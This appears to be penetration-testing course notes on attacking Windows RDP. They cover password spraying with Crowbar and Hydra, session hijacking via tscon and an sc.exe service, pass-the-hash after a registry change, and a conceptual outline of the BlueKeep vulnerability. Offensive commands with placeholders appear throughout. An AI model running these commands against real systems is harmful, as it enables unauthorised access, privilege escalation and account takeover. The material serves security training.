### Misconfiguration

One common attack against RDP is password guessing, it's possible but not common to find an RDP service without a password.

We can also try password spraying where we try a few usernames before trying another password, instead of password guessing, to avoid lockout policy.

We can use [Crowbar](https://github.com/galkan/crowbar) to preform password spraying.

#### Crowbar - RDP Password Spraying
```shell-session
# crowbar -b rdp -s <ip address>/32 -U <users file> -c '<password>'
```

#### Hydra - RDP Password Spraying
```shell-session
# hydra -L <users file> -p '<password>' <ip address> rdp
```

#### RDP Login
```shell-session
# rdesktop -u <username> -p <password> <ip address>
```

### Protocol Specific Attacks

In case we have compromised a machine with local admin privileges, if there is a user connected with RDP to our machine we can hijack the user's session to escalate privileges and impersonate the account.

##### RDP Session Hijacking

We can execute `query user` from PowerShell to see all users connected with RDP.

![[rdp_session-1-2.jpeg]]

To impersonate a user without a password we will need SYSTEM privileges, and the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. We will need to specify session id and name to open a new console as the specified session id:
```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

We can use methods such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz) to obtain SYSTEM privileges. A simple trick is to create a windows service that will run by default as local system, and will execute any binary with SYSTEM privileges. We can use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create). We will need to specify the service name and the binpath, which is the command we want to execute. We can create a service named `sessionhijack` with the following command:
```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

To run the command:
```cmd-session
C:\htb> net start sessionhijack
```

Once the service is started, a new terminal with the `lewen` user will appear.

_Note: This method no longer works on Server 2019._

### RDP Pass-the-Hash(PtH)

If we want to access applications or software on user's computer that is only available through GUI, and we have only the hash, in some instances we can perform RDP PtH attack.

There are a few caveats to this attack:

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
![[rdp_session-4.webp]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

##### Adding the DisableRestrictedAdmin Registry Key
```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[rdp_session-5.webp]]

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
```shell-session
# xfreerdp /v:<ip address> /u:<username> /pth:<NTLM hash>
```

This attack will not always work.

## Latest RDP vulnerabilities

`BlueKeep` ([CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)) is a vulnerability that leads to remote code execution, it does not require prior access to the system. Large organizations like hospitals which require specific versions and libraries for their software are particularly vulnerable.

### The Concept of the Attack

The vulnerability is based on manipulated requests sent to the targeted service, but it does not require authentication. It occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.

It involves many different steps in the kernel of the operating system, after the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used for us to write instructions for the CPU to execute. this [article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) provides a nice overview of the vulnerability.

#### Initiation of the Attack
|**Step**|**BlueKeep**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|Here, the source is the initialization request of the settings exchange between server and client that the attacker has manipulated.|`Source`|
|`2.`|The request leads to a function used to create a virtual channel containing the vulnerability.|`Process`|
|`3.`|Since this service is suitable for [administering](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) of the system, it is automatically run with the [LocalSystem Account](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privileges of the system.|`Privileges`|
|`4.`|The manipulation of the function redirects us to a kernel process.|`Destination`|

#### Trigger Remote Code Execution
| **Step** | **BlueKeep**                                                                                                                                                                                                                                                   | **Concept of Attacks - Category** |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| `5.`     | The source this time is the payload created by the attacker that is inserted into the process to free the memory in the kernel and place our instructions.                                                                                                     | `Source`                          |
| `6.`     | The process in the kernel is triggered to free the kernel memory and let the CPU point to our code.                                                                                                                                                            | `Process`                         |
| `7.`     | Since the kernel also runs with the highest possible privileges, the instructions we put into the freed kernel memory here are also executed with [LocalSystem Account](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privileges. | `Privileges`                      |
| `8.`     | With the execution of our instructions from the kernel, a reverse shell is sent over the network to our host.                                                                                                                                                  | `Destination`                     |

Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.